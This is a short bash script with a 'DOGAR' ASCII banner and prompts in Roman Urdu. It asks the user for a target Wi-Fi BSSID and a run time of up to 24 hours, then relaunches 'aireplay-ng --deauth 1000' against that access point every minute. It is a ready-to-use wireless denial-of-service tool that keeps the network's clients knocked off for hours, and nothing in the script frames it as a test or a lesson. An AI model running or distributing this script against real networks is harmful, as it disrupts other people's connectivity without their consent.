#!/bin/bash

# Check if lolcat is installed
if ! command -v lolcat &> /dev/null; then
  echo "lolcat utility is not installed. Installing it now..."
  sudo apt update && sudo apt install lolcat -y
fi

# Function to display the animated rainbow title
function display_title {
  cat << "EOF" | lolcat -a -d 10
═══════════════════════════════════════════════════════════════════
▓█████▄  ▒█████    ▄████  ▄▄▄       ██▀███  
▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒▒████▄    ▓██ ▒ ██▒
░██   █▌▒██░  ██▒▒██░▄▄▄░▒██  ▀█▄  ▓██ ░▄█ ▒
░▓█▄   ▌▒██   ██░░▓█  ██▓░██▄▄▄▄██ ▒██▀▀█▄  
░▒████▓ ░ ████▓▒░░▒▓███▀▒ ▓█   ▓██▒░██▓ ▒██▒
 ▒▒▓  ▒ ░ ▒░▒░▒░  ░▒   ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░
 ░ ▒  ▒   ░ ▒ ▒░   ░   ░   ▒   ▒▒ ░  ░▒ ░ ▒░
 ░ ░  ░ ░ ░ ░ ▒  ░ ░   ░   ░   ▒     ░░   ░ 
   ░        ░ ░        ░       ░  ░   ░     
 ░                                          
═══════════════════════════════════════════════════════════════════
EOF
}

# Display the rainbow title
clear
display_title

# Ask the user for duration
read -p "Kitne ghantay ke liye chalana hai? (1-24): " duration

# Input validation
if ! [[ $duration =~ ^[0-9]+$ ]] || [ "$duration" -lt 1 ] || [ "$duration" -gt 24 ]; then
  echo "Ghalat input. Sirf 1 se 24 tak number daalein." | lolcat
  exit 1
fi

# Convert time to seconds
total_seconds=$((duration * 3600))

# Ask user for BSSID input
read -p "BSSID likhein: " bssid

# Timer loop to execute commands
start_time=$(date +%s)
end_time=$((start_time + total_seconds))

while [ "$(date +%s)" -lt "$end_time" ]; do
  remaining_time=$((end_time - $(date +%s)))
  remaining_hours=$((remaining_time / 3600))
  remaining_minutes=$(( (remaining_time % 3600) / 60 ))
  remaining_seconds=$((remaining_time % 60))
  
  echo "Remaining time: ${remaining_hours}h:${remaining_minutes}m:${remaining_seconds}s" | lolcat
  
  # Execute aireplay-ng with xterm
  xterm -hold -e "sudo aireplay-ng --deauth 1000 -a $bssid wlan0mon" & sleep 60
  
  # Close xterm
  killall xterm 2>/dev/null
done

echo "$duration ghantay ke liye kaam complete ho gaya." | lolcat
